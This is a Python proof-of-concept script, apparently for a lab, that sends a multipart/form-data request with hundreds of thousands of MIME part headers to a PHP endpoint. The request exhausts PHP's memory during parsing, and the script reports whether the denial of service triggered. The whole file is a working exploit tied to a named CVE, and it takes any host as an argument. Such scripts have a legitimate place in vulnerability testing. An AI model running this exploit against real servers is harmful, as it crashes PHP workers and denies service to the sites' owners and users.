#!/usr/bin/env python3
"""Fire a crafted multipart/form-data body at a PHP endpoint over raw TCP.

The body is a single multipart part carrying a large number of MIME headers.
On the wire it is small; inside PHP every part header is materialised into a
hash-table entry, so the in-memory cost is a large multiple of the wire cost.
That is the "OOM strategy" described in CVE-2026-109618 / GHSA-w8hw-w9fx-j79w.

Prints a verdict so results are unambiguous:

  APP REACHED          request survived parsing; application code ran
  OOM BEFORE APP CODE  request aborted during startup parsing  == TRIGGERED
  NO RESPONSE          connection died with no HTTP reply

Usage:
  ./probe.py --port 8426 --headers 250000
  ./probe.py --port 8426 --headers 250000 --quiet
"""
import argparse
import re
import socket


def build_body(num_headers, hvlen, boundary):
    out = [("--" + boundary).encode()]
    out.append(b'Content-Disposition: form-data; name="f"; filename="a.txt"')
    out.append(b'Content-Type: text/plain')
    name = b"X-P"
    val = b"v" * hvlen
    for i in range(num_headers):
        out.append(name + str(i).encode() + b": " + val)
    out.append(b"")
    out.append(b"payload")
    out.append(("--" + boundary + "--").encode())
    out.append(b"")
    return b"\r\n".join(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--headers", type=int, default=300000)
    ap.add_argument("--hvlen", type=int, default=8, help="length of each header value")
    ap.add_argument("--path", default="/upload.php")
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--quiet", action="store_true", help="print only the verdict line")
    a = ap.parse_args()

    boundary = "----php2shellLAB"
    body = build_body(a.headers, a.hvlen, boundary)
    head = (
        f"POST {a.path} HTTP/1.1\r\n"
        f"Host: {a.host}:{a.port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    if not a.quiet:
        print(f"    wire body = {len(body):>11,} bytes  ({len(body)/1048576:6.2f} MiB)")
        print(f"    headers   = {a.headers:>11,}")

    resp, err = b"", None
    try:
        s = socket.create_connection((a.host, a.port), timeout=a.timeout)
        s.sendall(head + body)
        s.shutdown(socket.SHUT_WR)
        while True:
            try:
                chunk = s.recv(65536)
            except socket.timeout:
                err = "recv timeout"
                break
            if not chunk:
                break
            resp += chunk
        s.close()
    except (ConnectionResetError, BrokenPipeError, ConnectionError) as e:
        err = type(e).__name__

    body_text = (
        resp.split(b"\r\n\r\n", 1)[1].decode(errors="replace")
        if b"\r\n\r\n" in resp
        else resp.decode(errors="replace")
    )
    peak = None
    m = re.search(r"peak=(\d+)", body_text)
    if m:
        peak = int(m.group(1))

    if not resp and err:
        verdict = f"NO RESPONSE ({err}) -- worker likely died"
    elif "REACHED_APP" in body_text:
        verdict = f"APP REACHED (peak={peak/1048576:.1f} MiB) -- parsing survived, benign"
    elif "Allowed memory size" in body_text:
        verdict = "OOM DURING REQUEST STARTUP -- application code NEVER ran  >>> TRIGGERED <<<"
    elif not resp:
        verdict = "NO RESPONSE -- connection closed with no HTTP reply"
    else:
        verdict = "OTHER: " + body_text.strip()[:120]

    status = resp.split(b"\r\n", 1)[0].decode(errors="replace") if resp else "(none)"
    print(f"    status    = {status}")
    print(f"    >>> VERDICT: {verdict}")
    if not a.quiet and body_text.strip():
        print("    body:", body_text.strip().replace("\n", " ")[:200])


if __name__ == "__main__":
    main()
